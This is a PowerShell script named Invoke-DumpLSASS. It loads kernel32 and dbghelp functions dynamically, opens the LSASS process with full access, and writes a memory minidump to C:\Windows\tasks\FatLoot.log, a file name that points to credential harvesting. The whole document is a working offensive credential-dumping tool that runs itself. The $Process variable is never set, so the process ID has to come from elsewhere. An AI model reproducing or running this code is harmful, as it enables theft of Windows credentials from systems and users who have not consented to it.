function Invoke-DumpLSASS {

$NativeMethods = @'
using System;
using System.Runtime.InteropServices;

public class NativeMethods {

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool CloseHandleDelegate(IntPtr hObject);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool MiniDumpWriteDumpDelegate(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
}
'@

    Add-Type -TypeDefinition $NativeMethods

    $kernel32Handle = [NativeMethods]::LoadLibraryA("kernel32.dll")
    $dbghelpHandle = [NativeMethods]::LoadLibraryA("dbghelp.dll")

    $pOpenProcess = [NativeMethods]::GetProcAddress($kernel32Handle, "OpenProcess")
    $pCloseHandle = [NativeMethods]::GetProcAddress($kernel32Handle, "CloseHandle")
    $pMiniDumpWriteDump = [NativeMethods]::GetProcAddress($dbghelpHandle, "MiniDumpWriteDump")

    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pOpenProcess, [NativeMethods+OpenProcessDelegate])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCloseHandle, [NativeMethods+CloseHandleDelegate])
    $MiniDumpWriteDump = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pMiniDumpWriteDump, [NativeMethods+MiniDumpWriteDumpDelegate])

    $OutFile = "C:\Windows\tasks\FatLoot.log"

    Write-Host "[*] Attempting to obtain handle to LSASS"
    $Handle = $OpenProcess.Invoke(0x001F0FFF, $false, [UInt32]$Process)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to open the process."
        return
    } else {
        Write-Host "[*] Obtained handle: $Handle"
    }

    try {
        $FileHandle = [System.IO.File]::Create($OutFile).SafeFileHandle.DangerousGetHandle()
    }
    catch {
        Write-Host "[-] Failed to create the output file at $OutFile."
        $CloseHandle.Invoke($Handle) | Out-Null
        return
    }

    if ($FileHandle -eq [IntPtr]::Zero) {
        Write-Host "[-] Failed to obtain a handle to the output file."
        $CloseHandle.Invoke($Handle) | Out-Null
        return
    }

    $Dumped = $MiniDumpWriteDump.Invoke($Handle, $Process, $FileHandle, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($Dumped) {
        Write-Host "[+] Successfully dumped to $OutFile"
    } else {
        Write-Host "[-] Failed to dump process"
        return
    }

    if (-not $CloseHandle.Invoke($Handle)) {
        Write-Host "[-] Failed to close the handle"
    } else {
        Write-Host "[*] Handle $Handle successfully closed"
    }

    Write-Host "[*] Closed handles successfully."
}

Invoke-DumpLSASS
